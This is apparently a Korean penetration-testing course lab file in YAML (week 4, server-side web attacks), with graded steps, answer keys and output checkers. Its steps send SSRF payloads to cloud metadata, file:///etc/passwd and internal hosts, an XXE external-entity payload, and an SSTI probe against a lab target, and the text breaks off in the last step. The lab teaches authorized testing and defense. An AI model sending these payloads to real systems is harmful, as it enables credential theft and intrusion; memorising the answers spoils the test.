lab_id: standalone-attack-adv-week04
title: "웹 고급 — SSRF·XXE·SSTI로 서버 내부를 공략한다"
version: standalone-attack-adv
course: attack-adv
week: 4
description: |
  공격 고급 W04 — 서버측 웹 취약점. 클라이언트측(XSS)을 넘어 서버 자체를 공략한다. SSRF(서버측 요청 위조로
  내부/클라우드 메타데이터 접근)·XXE(XML 외부 엔티티로 파일 읽기)·SSTI(템플릿 주입→RCE)를 페이로드로
  작성·전송하고 WAF/앱 응답을 해석한다. el34-attacker에서 인가 표적(el34-web)에. ⚠️ 인가된 실습만.
difficulty: hard
duration_minutes: 185
prerequisites:
  - "attack-adv W01~W03 + web-vuln 트랙(SQLi/XSS) 통과"
  - "el34 호스트 SSH + docker exec, el34-attacker"
  - "lecture §2(SSRF) §3(XXE) §4(SSTI) 숙지"
objectives:
  - "SSRF로 내부/메타데이터 접근 페이로드 작성·전송"
  - "XXE 외부 엔티티·SSTI 표현식 페이로드 이해"
  - "서버측 취약점의 영향(RCE·내부 침투)과 방어 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 서버측 공격 표면 확인
      **실습 의미:** 서버측 취약점은 서버가 입력을 '처리'하는 곳(URL fetch·XML 파싱·템플릿 렌더링)에서 생긴다 — 먼저 서버측 표적(admin vhost) 도달을 확인한다. **⚠️ 인가된 el34 표적에만.**
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 서버측 표적(admin.el34.lab vhost)에 도달하는지 응답코드 확인
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" http://10.20.30.1/)
        echo "admin=$C"
        # 표적에 도달했으면 서버측 표면 준비 마커
        [ -n "$C" ] && echo serverside_ready
      '
      ```
      ## ✅ 합격 기준
      `serverside_ready`(과 admin 코드)가 출력되면 통과. **근거:** 마커는 서버측 표적에서 응답코드를 실제 받았을 때만 찍히므로, SSRF/XXE/SSTI를 시험할 표면이 확인됐음을 뜻한다.
    hint: '서버측 표면'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # 서버측 표적(admin vhost) 도달 확인
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" http://10.20.30.1/)
        echo "admin=$C"
        # 도달 시 서버측 표면 준비 마커
        [ -n "$C" ] && echo serverside_ready
      '
    answer_detail: "서버측 표면 = 서버가 입력을 처리하는 지점(fetch/파싱/렌더). 클라이언트측(XSS)보다 영향이 큼."
    verify:
      type: output_contains
      expect: 'serverside_ready'
      field: stdout
      semantic: {intent: "서버측 표면", success_criteria: ["표적"], acceptable_methods: ["**[OSS] curl (권장)**"]}
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 SSRF ① 클라우드 메타데이터
      **실습 의미:** SSRF는 서버가 공격자 지정 URL을 대신 요청하게 만든다 — 외부에선 못 닿는 클라우드 메타데이터(169.254.169.254)에 접근해 IAM 자격 노출을 노린다(WAF가 403이면 탐지됨).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # SSRF①: 서버가 클라우드 메타데이터(169.254.169.254)를 대신 요청하게 만든다 (IAM 자격 표적)
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")
        echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
        # 페이로드 응답을 받았으면 마커
        [ -n "$C" ] && echo ssrf_meta_done
      '
      ```
      ## ✅ 합격 기준
      `ssrf_meta_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 SSRF 메타데이터 페이로드의 응답을 실제 받았을 때만 찍히므로, 서버측 요청 위조를 시도하고 WAF 차단(403) 여부를 관찰했음을 뜻한다.
    hint: 'SSRF 메타데이터'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # SSRF 메타데이터 페이로드 전송
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/aa04test")
        echo "ssrf_meta=$C (403=ModSec SSRF 룰 탐지)"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo ssrf_meta_done
      '
    answer_detail: "SSRF 메타데이터 = 서버가 169.254.169.254를 대신 요청→IAM 자격 탈취. ModSec이 403 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_meta_done'
      field: stdout
      semantic: {intent: "SSRF 메타데이터", success_criteria: ["169.254"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 SSRF ② 내부 파일·서비스 (file://, 내부 IP)
      **실습 의미:** SSRF는 file:// 스킴으로 로컬 파일을, 내부 IP로 비공개 서비스를 노린다 — 서버를 프록시 삼아 내부망으로 피벗하는 발판이다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # SSRF②a: file:// 스킴으로 로컬 파일 읽기 시도
        F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"
        # SSRF②b: 내부 IP의 비공개 서비스 접근 시도
        I=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"
        # 두 페이로드 응답을 받았으면 마커
        [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
      '
      ```
      ## ✅ 합격 기준
      `ssrf_internal_done`(과 file/internal 코드)이 출력되면 통과. **근거:** 마커는 file://·내부 IP 두 SSRF 페이로드의 응답을 모두 받았을 때만 찍히므로, 서버를 프록시로 내부 자원을 노리는 시도를 했음을 뜻한다.
    hint: 'SSRF 내부'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # file:// 로컬 파일 읽기 시도
        F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd%23aa04test"); echo "file=$F"
        # 내부 IP 비공개 서비스 접근 시도
        I=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://10.20.30.5:8080/aa04test"); echo "internal=$I"
        # 두 응답 받았으면 마커
        [ -n "$F" ] && [ -n "$I" ] && echo ssrf_internal_done
      '
    answer_detail: "SSRF 내부 = file://(파일)·내부 IP(비공개 서비스). 서버를 프록시 삼아 내부망 피벗. ModSec 탐지."
    verify:
      type: output_contains
      expect: 'ssrf_internal_done'
      field: stdout
      semantic: {intent: "SSRF 내부", success_criteria: ["file/내부IP"], acceptable_methods: ["**[OSS] SSRF (권장)**"]}
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 XXE — XML 외부 엔티티
      **실습 의미:** XXE는 XML 파서가 외부 엔티티(SYSTEM file://)를 처리하게 해 서버 파일을 읽거나 SSRF로 연결한다 — 방어는 파서의 외부 엔티티·DTD 비활성화다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # XXE: 외부 엔티티(SYSTEM file://)로 서버 파일을 읽게 하는 XML 페이로드 전송
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" -H "Content-Type: application/xml" --data "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>" "http://10.20.30.1/api/xml")
        echo "xxe=$C"
        # XXE 페이로드 응답을 받았으면 마커
        [ -n "$C" ] && echo xxe_done
      '
      ```
      ## ✅ 합격 기준
      `xxe_done`(과 응답코드)이 출력되면 통과. **근거:** 마커는 외부 엔티티 XML 페이로드의 응답을 실제 받았을 때만 찍히므로, XML 파서의 외부 엔티티 처리를 노린 시도를 했음을 뜻한다.
    hint: 'XXE'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # XXE 외부 엔티티 XML 페이로드 전송
        C=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" -H "Content-Type: application/xml" --data "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>aa04test&x;</r>" "http://10.20.30.1/api/xml")
        echo "xxe=$C"
        # 응답 받았으면 마커
        [ -n "$C" ] && echo xxe_done
      '
    answer_detail: "XXE = XML 외부 엔티티로 파일 읽기/SSRF. 방어는 파서의 외부 엔티티·DTD 비활성화."
    verify:
      type: output_contains
      expect: 'xxe_done'
      field: stdout
      semantic: {intent: "XXE", success_criteria: ["외부 엔티티"], acceptable_methods: ["**[OSS] XXE (권장)**"]}
    target_vm: web

  - order: 5
    instruction: |
      ## 🎯 SSTI — 서버측 템플릿 주입
      **실습 의미:** 사용자 입력이 템플릿으로 평가되면 {{7*7}}→49로 코드가 실행되고 결국 RCE로 이어진다 — 49 반사 여부로 SSTI 취약성을 탐지한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # SSTI 탐지: {{7*7}}를 입력으로 보내 49로 평가·반사되는지 본다 (49 반사=템플릿 평가=취약)
        curl -s -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7Daa04test" 2>/dev/null | grep -oE "49|aa04test" | head
        echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
        # SSTI 탐지 페이로드를 실제 전송했으면 마커
        curl -s -o /dev/null -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7D" 2>/dev/null && echo ssti_done
      '
      ```
      ## ✅ 합격 기준
      `ssti_done`(과 반사 결과)이 출력되면 통과. **근거:** 마커는 SSTI 탐지 페이로드가 실제 전송됐을 때만 찍히므로, 49 반사 여부로 템플릿 평가(SSTI) 가능성을 점검했음을 뜻한다.
    hint: 'SSTI'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # {{7*7}} 탐지 페이로드 전송 → 49/aa04test 반사 확인
        curl -s -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7Daa04test" 2>/dev/null | grep -oE "49|aa04test" | head
        echo "(49 반사면 SSTI 취약, 다음 단계는 RCE)"
        # 페이로드 전송됐으면 마커
        curl -s -o /dev/null -H "Host: admin.el34.lab" "http://10.20.30.1/?name=%7B%7B7*7%7D%7D" 2>/dev/null && echo ssti_done
      '
    answer_detail: "SSTI = 입력이 템플릿으로 평가({{7*7}}→49). RCE로 확장 가능. 방어는 입력의 템플릿 평가 금지(샌드박스)."
    verify:
      type: output_contains
      expect: 'ssti_done'
      field: stdout
      semantic: {intent: "SSTI", success_criteria: ["템플릿 평가"], acceptable_methods: ["**[OSS] SSTI (권장)**"]}
    target_vm: web

  - order: 6
    instruction: |
      ## 🎯 영향 연쇄 — 서버측 취약점 → RCE/내부 침투
      **실습 의미:** 서버측 취약점은 서버 자체를 장악한다(SSRF→클라우드 자격/내부 피벗, XXE→파일, SSTI→RCE) — SSRF 페이로드가 실제 서버에 도달하는지 응답으로 집계해 영향을 입증한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # SSRF 메타데이터 페이로드를 실제 전송
        M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/")
        # SSRF file:// 페이로드를 실제 전송
        F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd")
        echo "SSRF메타=$M SSRF파일=$F"
        # 서버에 도달한(000 아닌) 페이로드 수를 센다
        CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done
        echo "도달 페이로드: $CNT/2"
        # 1개 이상 도달했으면 영향 연쇄 마커
        [ "$CNT" -ge 1 ] && echo impact_done
      '
      ```
      ## ✅ 합격 기준
      `impact_done`(과 도달 수)가 출력되면 통과. **근거:** 마커는 SSRF 페이로드가 실제 서버에 도달(응답≠000)했을 때만 찍히므로, 서버측 공격이 서버에 닿아 영향을 미칠 수 있음을 실증했음을 뜻한다.
    hint: '영향 연쇄'
    category: report
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # SSRF 메타데이터·file 페이로드 실제 전송
        M=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/")
        F=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=file:///etc/passwd")
        echo "SSRF메타=$M SSRF파일=$F"
        # 도달(000 아님) 페이로드 수 집계
        CNT=0; for c in $M $F; do [ "$c" != "000" ] && CNT=$((CNT+1)); done
        echo "도달 페이로드: $CNT/2"
        # 1개 이상 도달 시 영향 연쇄 마커
        [ "$CNT" -ge 1 ] && echo impact_done
      '
    answer_detail: "영향 연쇄 = SSRF 메타/file 페이로드 실제 전송→응답 집계 게이트. 가짜 echo 아닌 실증. 서버측은 서버 장악."
    verify:
      type: output_contains
      expect: 'impact_done'
      field: stdout
      semantic: {intent: "영향 연쇄", success_criteria: ["RCE/내부"], acceptable_methods: ["**[설명] 영향 (권장)**"]}
    target_vm: web

  - order: 7
    instruction: |
      ## 🎯 방어 — 서버측 취약점 차단
      **실습 의미:** 근본 방어는 코드(SSRF allowlist·XXE 외부엔티티 비활성·SSTI 템플릿 평가 금지)지만 WAF가 보조 다층이다 — WAF가 SSRF를 실제 차단(403)하는지 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 방어 검증: SSRF 메타데이터 요청을 보내 WAF가 차단(403)하는지 본다
        code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: admin.el34.lab" "http://10.20.30.1/files/read?url=http://169.254.169.254/latest/meta-data/")
        echo "SSRF 메타데이터 요청 → WAF 응답 $code"
        # WAF가 403으로 실제 차단하면 방어 검증 마커
        [ "$code" = "403" ] && echo "WAF가 SSRF 차단(다층 방어 1선)" && echo defense_done
      '
      ```
      ## ✅ 합격 기준
      `defense_done` 출력 시 통과. **근거:** 마커는 WAF가 SSRF 메타데이터 요청을 실제 403으로 차단할 때만 찍히므로, 다층 방어의 1선(WAF)이 동작함을 실측했음을 뜻한다.
    hint: '방어'
    category: report
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # SSRF 메타데이터 요청 → WAF 차단(403) 확인
